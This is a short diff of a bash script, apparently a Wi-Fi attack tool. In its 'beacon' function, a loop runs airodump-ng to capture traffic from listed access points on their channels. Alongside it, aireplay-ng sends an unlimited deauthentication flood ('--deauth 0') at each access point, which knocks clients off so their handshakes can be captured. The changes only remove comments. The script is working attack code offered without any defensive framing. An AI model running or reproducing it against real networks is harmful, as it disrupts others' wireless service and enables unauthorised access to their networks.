@@ -73,25 +73,17 @@ function beacon() {
     for ((i=0; i<${#maclist[@]}; i++)); do
         (
             xterm -T "dump" -e sudo airodump-ng -w caps/${keylist[$i]} -c ${chanlist[$i]} --bssid ${maclist[$i]} wlan0 &
-            #sleep 3  # Adjust this sleep time as needed
         ) &
         
         (
-            #sleep 1  # Sleep for a bit before starting aireplay
             xterm -T "play" -e sudo aireplay-ng --deauth 0 -a ${maclist[$i]} wlan0 &
         ) &
 
-        sleep 3  # Adjust this sleep time as needed
+        sleep 3
     done
-
-    # Wait for all background processes to finish
     wait
 }
 
-
-#function deauth(){
-#    local mac=$1
-#}
 
 recuperaredes
 
